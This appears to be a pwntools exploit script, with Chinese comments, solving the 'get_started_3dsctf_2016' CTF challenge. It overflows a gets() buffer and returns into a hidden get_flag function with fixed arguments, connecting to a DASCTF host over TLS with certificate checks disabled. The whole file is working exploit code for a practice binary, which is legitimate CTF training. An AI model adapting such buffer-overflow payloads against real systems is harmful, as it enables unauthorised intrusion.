from pwn import *
import ssl
import re

# * CTF2 平台使用 TLS，必须手动创建 SSL 上下文并关闭证书校验
ssl_context = ssl.create_default_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

context.log_level = 'info'
context.arch = 'i386'
context.os = 'linux'

host = "74c46cbae80d28d180233a3b.tcp-ctf2.dasctf.com"
port = 9999

# * ---------- 静态分析得到的硬编码地址（非 PIE，直接写死） ----------
BINARY = './get_started_3dsctf_2016'

# main: lea eax, [esp+4] -> gets(eax)，返回地址在 [esp+0x3c]
# 偏移 = 0x3c - 0x4 = 0x38 = 56 字节
OFFSET = 0x38

GET_FLAG = 0x080489a0   # 未被 main 调用的隐藏后门
EXIT_ADDR = 0x0804e6a0  # get_flag 返回后回到 exit()，确保 stdio 缓冲区被刷新

# get_flag 要求的前两个参数（cdecl：参数 1 在 [esp+0x10]，参数 2 在 [esp+0x14]）
ARG1 = 0x308cd64f
ARG2 = 0x195719d1


def build_payload():
    """
    i386 是 cdecl：ret 进入 get_flag 后，栈顶依次是
        [esp]     -> 伪造的返回地址 exit
        [esp+4]   -> 参数 1
        [esp+8]   -> 参数 2
    get_flag 自己 push esi / sub esp,8，所以 [esp+0x10] 正好读到参数 1。

    32 位 i386 的 glibc 不要求像 amd64 那样 16 字节栈对齐，
    这里不需要额外的 ret gadget 做栈对齐。
    """
    return flat(
        b'A' * OFFSET,
        p32(GET_FLAG),
        p32(EXIT_ADDR),
        p32(ARG1),
        p32(ARG2),
    )


def exploit():
    if args.LOCAL:
        print("[*] Local mode: ./get_started_3dsctf_2016")
        p = process(BINARY)
    else:
        print(f"[*] 正在连接 {host}:{port} (TLS)...")
        p = remote(host, port, ssl=True, ssl_context=ssl_context, sni=host)

    # 提示语 "Qual a palavrinha magica?" 不带换行，非 tty 时会被 stdio 全缓冲，
    # 不能 recvuntil 等它；gets() 在程序启动后立刻可读，直接发送 payload 即可。
    payload = build_payload()
    log.info(f"payload = {len(payload)} bytes, ret -> get_flag@{hex(GET_FLAG)}")
    log.info(f"args = ({hex(ARG1)}, {hex(ARG2)}), fake ret -> exit@{hex(EXIT_ADDR)}")
    p.sendline(payload)

    result = p.recvall(timeout=10).decode('utf-8', errors='ignore')

    # 用正则提取真正的 Flag
    flags = re.findall(r"(?:CTF2|flag|DASCTF)\{[^}]+\}", result)
    if flags:
        print(f"\n\n[🎉] GOT THE FLAG: {flags[0]}\n\n")
    else:
        print("[-] Flag not found, here is the raw output:")
        print(result)


if __name__ == '__main__':
    exploit()

